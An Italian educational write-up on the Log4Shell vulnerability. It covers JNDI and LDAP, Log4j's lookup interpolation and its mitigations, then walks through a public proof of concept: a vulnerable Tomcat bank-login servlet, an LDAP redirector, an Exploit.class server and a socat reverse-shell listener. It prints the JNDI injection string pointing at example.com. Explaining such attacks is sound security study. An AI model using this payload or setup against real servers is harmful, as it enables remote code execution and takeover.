# Log4Shell

Log4Shell è una vulnerabilità del software di logging Apache Log4j che permette all'attaccante di eseguire codice arbitrario (RCE: Remote Code Execution) sul server vulnerabile.
Il vettore di attacco di questa vulnerabilità è un payload malevolo (stringa), che quando viene loggata permette all'utente di eseguire codice arbitrario sulla macchina, sfruttando due protocolli rispettivamente di indicizzazione e caricamento di oggetti Java remoti.

## Java Naming and Directory Interface (JNDI)
Si tratta di una Application Programming Interface che **offre un servizio di accesso a cartelle**, che permettono a programmi Java di 
**scoprire risorse e dati (sotto forma di oggetti Java)** tramite nome. <br>
Come tutte le API Java JNDI è indipendente dall'implementazione sottostante, e **supporta diversi SPI (service provider interface)** che offrono servizi di directory implementate diversamente. Le informazioni scoperte e caricate tramite JNDI possono essere offerte da: *server*, file, database... la scelta dipende dall'implementazione utilizzata.

Esempi di SPI supportati da JNDI: **LDAP**, DNS, NIS, CORBA, file system.

### Lookup
JNDI organizza i nomi in una gerarchia, simile a quella dei package di Java (`com.example.test.MyObject`), quindi l'accesso all'oggetto,
può essere definito tramite interfaccia (`implements Name`) oppure direttamente come `String`.<br>
Generalmente oltre al nome dell'oggetto che si vuole ottenere si ha bisogno anche di un contesto con le informazioni necessarie allo SPI.

## Lightweight Directory Access Protocol (LDAP)
Si tratta di un protocollo internet di livello applicativo per acceder a *servizi di informazioni su cartelle* inizialmente
creato per l'indicizzazione di cartelle di contatti, ad esempio rubriche telefoniche o contatti aziendali.<br>
Un client inizializza una sessione **LDAP** connettendosi ad un server, chiamato *Directory System Agent (DSA)*, le porte di default sono: 389 TCP e UDP, oppure 636 per LDAPS (LDAP over TLS/SSL). 

Il protocollo supporta diverse operazioni, sia di accesso che di modifica file.<br>
I dettagli dell'utilizzo originale di questo protocollo non sono particolarmente interessanti per il nostro caso di studio, tuttavia è da notare che LDAP supporta uno **schema URI** ben preciso per fare query dentro alle directory: `ldap://host:port/DN?attributes?scope?filter?extensions`.
Questo sarà un passaggio chiave per permettere l'accesso automatizzato all'oggetto Java malevolo.

## Comportamento Vulnerabile
Nella configurazione di default, quando la libreria **Log4j** scrive una stringa nei log attua una 
sostituzione di stringhe su espressione della forma: `${prefix:name}` (string interpolation).<br>
Esempio: `Version: ${java:version}` diventa `Version: Java version 1.8.0_102`.
Tra le espressioni può utilizzare il ptocollo JNDI `${jndi:<ricerca>}` e si può specificare una risorsa remota tramite diversi protocolli tra cui LDAP: `${jndi:ldap://example.com/arbitrary_file}`.

Questo apre la possibilità all'attaccante tramite il logging una stringa all'interno del server di caricare ed eseguire codice malevolo servito su un url pubblico.

LDAP non è l'unico protocollo supportato da JNDI che potrebbe essere sfruttato tramite la vulnerabilità Log4Shell, altri protocolli sono: LDAPS, RMI, DNS, IIOP.

## Mitigazione
Le fix per questa vulnerabilità sono state rilasciate 3 giorni prima che la vulnerabilità fosse resa pubblica (Log4j-2.15.0-rc1). Sono state poi individuate da ricercatori altre vulnerabilità legate e derivate dalla prima, che permettevano di agire in certi tipi di configurazione (2.16.0) o con attacchi diversi da RCE come DoS (2.17.0).

Sono state prese misure di prevenzione anche nella Java Runtime Environment (JRE) dove è stato bloccato di default il caricamento di codice remoto.

Dove non possibile aggiornare le versioni l'approccio è stato quello di filtrare il traffico in uscita al server vulnerabile, bloccando certi protocolli.


# Proof of Concept
![project structure](img/project_structure.png)

La prova di concetto che è stata utilizzata per visualizzare una dimostrazione pratica dell'applicazione
della vulnerabilità è: https://github.com/Dav-Forks-lab/log4j-shell-poc una fork dell'omonima repository che contiene il codice originale.

Tra tutte le possibili varianti di questo attacco questa PoC si concentra su utilizzare un server LDAP creato ad hoc per servire il file dell'exploit indipendentemente dalla stringa payload utilizzata.<br>
Il file di exploit è quindi in automatico richiesto dal server che per ottenerlo esegue codice di inizializzazione che permette di fare il setup di una reverse shell verso l'attaccante, che quindi finisce per avere i **privilegi che ha il processo che esegue il server vulnerabile** (possibilmente anche **root**), *dirottando il thread* dell'esecuzione della risposta.

**porte dei server utilizzate**:
- `8080` → Server vulnerabile che utilizza libreria Log4j
- `1389` → Proof of Concept in Python (LDAP server che ridireziona l'accesso all'Exploit)
- `8000` → webport server HTTP di base usato dal protocollo LDAP
- `9001` → socat per mettersi in ascolto sulla porta su cui verra eseguito reverse shell


## Server Vulnerabile (porta `8080`)

Si tratta di un server containerizzato utilizzante una vecchia versione di **Apache Tomcat** che utilizza come JRE la versione `1.8-u102` rilasciata molto tempo prima che la JRE fosse protetta dall'abilitazione automatica dell'esecuzione remota di codice.

Tuttavia siccome l'immagine di Docker utilizzata prendeva la versione della JRE dalle repository di Debian essa conteneva backport delle fix delle JRE più recenti, questo ha portato alla scelta di utilizzare la versione originale della JRE scaricata dal sito di Oracle e inserita nell'imagine tramite Dockerfile.

Sul server con JRE obsoleto di TomCat è eseguito un **Java Servlet** buildato tramite *maven* che usa una versione di Log4j precedente al fix della vulnerabilità (`2.14.1`).<br>
Il Servlet mostra una pagina fac-simile del login di una banca, per rendere *vero-simile l'attacco*,
il codice eseguito alla pressione del tasto login utilizza la versione vulnerabile di Log4j 
per **scrivere nei log il nome utente** relativo a credenziali errate che è stato inserito (e.g. controllo di possibili *dictionary attacks*).


## Attacco (Python Proof of Concept)
Lo script di python (`poc.py`) prende 3 argomenti in input:
- `--userip`: ip del server che contiene i servizi dell'attaccante (in questa PoC è un singolo ip localhost)
- `--webport`: porta del server HTTP che serve il file `Exploit.class`
- `--lport`: porta del servizio SOCAT in ascolto per la creazione della reverse shell

### Generazione del Payload

L'exploit scritto in linguaggio Java è una classe contenente ObjectFactory, questo perché JNDI ha un sistema di auto-istanziazione delle **Object Factories** che permettono quindi di ottenere l'oggetto costruendolo direttamente sul serfver chiamando il metodo `getObjectInstance`; <br>
tuttavia all'interno di questo metodo di costruzione dell'oggetto può esserci un qualunque codice arbitrario, che apre la possibilità a RCE (Remote Code Execution), e quindi come esempio più classico **reverse shell**.

![exploit](img/exploit.png)

Lo script contiene l'exploit scritto sotto forma di stringa letterale in python, questo viene scritto nel file `Exploit.java` interpolando l'ip e porta dell'attaccante utilizzati per fare reverse shell, questo viene compilato utilizzando una vecchia versione della JDK (`1.8-u20`), creando un file `Exploit.class`.


### Server attaccante: vettori d'attacco

![payload](img/payload.png)

In seguito lo script procede a creare un thread dove esegue il server LDAP partendo dal file: `marshalsec-0.0.3-SNAPSHOT-all.jar` utilizzando la runtime `jdk-1.8-u20`, risorse binarie offerte dalla repository [mbechler/marshalsec](https://github.com/mbechler/marshalsec) che contiene tooling relativo ad un paper informativo sulle vulnerabilità possibili derivate dai sistemi di *smistamento* (serializzazione/deserializzazione/remote_callbacks) di oggetti in Java.

![ldap_server](img/ldap_server.png)

Questo server LDAP **ritorna in automatico reference JNDI valide** quando viene fatta una richiesta LDAP di qualsiasi tipo ritorna un oggetto JNDI dal server HTTP alla porta `8000` facendo il fetch dell'oggetto (classe) con nome dopo il carattere `#`, nel caso della nostra PoC: `http://localhost:8000/#Exploit`

Riguardo al server HTTP che offre il file bytecode dell'exploit, si nota che diversamente dalla PoC originale, questa fork utilizza:
-  `LoggingHTTPRequestHandler` invece che `SimpleHTTPRequestHandler` per avere logging delle richieste HTTP avvenute
-  `DualStackHTTPServer` invece che `HTTPServer` per essere compatibile con Java for Linux che di default utilizza server HTTP dual-stack (both sockets IPv4 & IPv6)

### Attuazione attacco

A questo punto l'attaccante può procedere all'attaco del server vulnerabile in un qualsiasi browser,
inserendo la stringa malevola, all'interno del campo che l'attaccante sa che verrà loggato.
![homepage](img/homepage.png)

Poi Log4j farà parsing della stringa contenente l'interpretazione JNDI della risorsa ottenuta dal server
LDAP di cui è stato fatto il setup precedentemente, in seguito in file binario sarà ottenuto dal server dell'attaccante e successivamente istanziato tramite il meccanismo di JNDI (`getObjectInstance()`).

![tomcat](img/tomcat.png)
![ldap](img/ldap.png)

Infine l'esecuzione dell'exploit dirotterà il thread della richiesta al server vulnerabile verso una connessione socket (dual-stack) verso il listener attivo sulla porta `9001` dell'ip dell'attaccante.

L'attaccante ha ora l'accesso completo alla macchina dipendentemente dai privilegi con cui è stato eseguito il processo del server tomcat.

![reverse_shell](img/reverse_shell.png)

## Conclusione
Log4Shell è una vulnerabilità che ha scosso innumerevoli server e sistemi software vari che utilizzavano Log4j come libreria di log, o sistemi nei quali le loro dipendenze sfruttavano Log4j come libreria di log, la vulnerabilità è dovuta a una misconfigurazione e del valore di default per il parsing di questi protocolli che è attivo di default, feature raramente considerata tra le feature principali della libreria.

